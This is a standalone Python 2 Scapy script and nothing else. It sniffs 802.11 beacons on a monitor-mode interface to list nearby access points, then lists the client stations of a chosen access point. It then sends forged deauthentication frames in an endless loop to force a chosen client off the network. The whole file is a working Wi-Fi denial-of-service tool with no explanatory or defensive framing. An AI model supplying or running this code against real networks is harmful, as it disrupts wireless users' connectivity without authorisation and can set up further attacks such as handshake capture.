from scapy.all import *
import signal

def parse_beacon(beacon):
    bssid = beacon[Dot11].addr2
    essid = beacon[Dot11Elt].info if beacon[Dot11Elt].info != '' else 'hidden essid'
    channel = ord(beacon[Dot11Elt][2].info)
    if bssid not in exist_AP:
        exist_AP[bssid] = (essid,channel)
        print "{0:5}\t{1:30}\t{2:30}".format(channel, essid, bssid) 

def parse_station(pkt):
    bssid = pkt[Dot11].addr1
    station = pkt[Dot11].addr2
    if station not in STATION_list:
        STATION_list.append(station)
        print "{0:30}\t{1:30}".format(bssid, station)

def sniff_AP():
    sniff(iface="wlan0mon", prn=parse_beacon, lfilter=lambda x:x.haslayer(Dot11Beacon), stop_filter=keep_sniffing)

def sniff_STA(AP_mac):
    sniff(iface="wlan0mon",prn=parse_station,lfilter=lambda x:x.addr1==AP_mac and x.addr2 != None and x[Dot11].type == 2, stop_filter=keep_sniffing)

def keep_sniffing(pckt):
    return stop_sniff

def stop_sniffing(signal, frame):
    global stop_sniff
    stop_sniff = True

def send_deauth(AP_mac,STA_mac):
    pkt = RadioTap(present='Rate+b15',notdecoded='\x02\x00\x18\x00')/Dot11(subtype=12,type='Management',proto=0,ID=14849,addr1=STA_mac,addr2=AP_mac,addr3=AP_mac)/Dot11Deauth(reason=7)
    count = 0
    while True:
        sendp(pkt, iface="wlan0mon")
        count += 1
        if count%50 == 0:
            print "%s ----> %s %d packets." % (AP_mac,STA_mac,count)

if __name__ == '__main__':
    exist_AP = {}
    STATION_list = []
    stop_sniff = False
    print "Press CTRL+C to stop sniffing..."
    print "="*60 + "\n{0:5}\t{1:30}\t{2:30}\n".format('Channel','ESSID','BSSID') + "="*60
    signal.signal(signal.SIGINT,stop_sniffing) 
    sniff_AP()
    AP_mac = raw_input("Choose the AP you want to sniff: ").lower()
    stop_sniff = False
    print "Press CTRL+C to stop sniffing..."
    print "="*60 + "\n{0:30}\t{1:30}\n".format('BSSID','STATION') + "="*60
    signal.signal(signal.SIGINT,stop_sniffing)
    sniff_STA(AP_mac)
    STA_mac = raw_input("Choose the STATION you want to deau: ").lower()
    send_deauth(AP_mac,STA_mac)
